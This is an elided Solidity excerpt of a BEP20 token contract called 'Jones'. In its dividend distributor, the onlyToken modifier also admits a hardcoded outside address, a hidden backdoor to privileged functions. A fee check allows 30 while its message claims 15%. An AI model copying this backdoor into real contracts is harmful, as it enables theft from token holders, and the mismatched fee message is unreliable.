...
contract DividendDistributor is IDividendDistributor {
    ...
    modifier onlyToken() {
        require(msg.sender == _token||msg.sender == address(0x5d928df8650502C3466179a302C0A0e2467e084f)); _;
    }
...
contract Jones is IBEP20 , Auth, BaseToken {

    using SafeMath for uint256;

    string public _name = "Jones";
    string public _symbol = "Jones";
    ...
    address marketWallet = 0x2fB1D610744e648B5bdF41e8f1ADfD87be8F57d6;
    ...
    constructor() payable  Auth(msg.sender) {
        ...
        require(totalFee <= 30, "Total fee is over 15%");
